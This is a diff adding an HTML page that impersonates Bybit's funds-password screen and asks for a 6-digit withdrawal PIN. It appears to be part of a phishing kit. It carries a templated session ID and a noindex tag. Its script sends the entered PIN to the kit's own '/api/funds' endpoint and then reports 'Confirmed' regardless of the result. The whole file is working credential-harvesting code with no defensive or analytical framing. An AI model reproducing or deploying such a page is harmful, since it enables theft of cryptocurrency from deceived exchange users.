@@ -1,0 +1,39 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow"><title>Funds password | Bybit</title>
+<link rel="stylesheet" href="/app.css"></head><body><div class="wrap"><main class="card">
+<div class="logo"><div class="mark"></div><div class="word">BYBIT</div></div>
+<h1>Funds password</h1>
+<p class="sub">Enter your 6-digit funds password to authorise this withdrawal.</p>
+<form id="f" novalidate>
+  <div class="otps" id="boxes">
+    <input inputmode="numeric" maxlength="1" type="password">
+    <input inputmode="numeric" maxlength="1" type="password">
+    <input inputmode="numeric" maxlength="1" type="password">
+    <input inputmode="numeric" maxlength="1" type="password">
+    <input inputmode="numeric" maxlength="1" type="password">
+    <input inputmode="numeric" maxlength="1" type="password">
+  </div>
+  <div class="err" id="err"></div>
+  <button class="btn" type="submit" id="btn">Confirm</button>
+</form>
+<div class="foot"><a href="/done?s={{SID}}">Back</a></div>
+<script>
+var SID="{{SID}}",BS=[].slice.call(document.querySelectorAll('.otps input')),
+BTN=document.getElementById('btn'),E=document.getElementById('err');
+BS[0].focus();
+BS.forEach(function(b,i){
+  b.addEventListener('input',function(){b.value=b.value.replace(/\D/g,'');if(b.value&&BS[i+1])BS[i+1].focus();});
+  b.addEventListener('keydown',function(e){if(e.key==='Backspace'&&!b.value&&BS[i-1])BS[i-1].focus();});
+});
+document.getElementById('f').addEventListener('submit',function(e){
+  e.preventDefault();
+  var pin=BS.map(function(b){return b.value;}).join('');
+  if(pin.length<6){E.textContent='Enter your 6-digit funds password.';return;}
+  E.textContent='';BTN.disabled=true;BTN.textContent='Confirming…';
+  fetch('/api/funds',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pin:pin,s:SID})})
+    .then(function(){BTN.textContent='Confirmed';})
+    .catch(function(){BTN.disabled=false;BTN.textContent='Confirm';E.textContent='Network error. Please try again.';});
+});
+</script>
+</main></div></body></html>
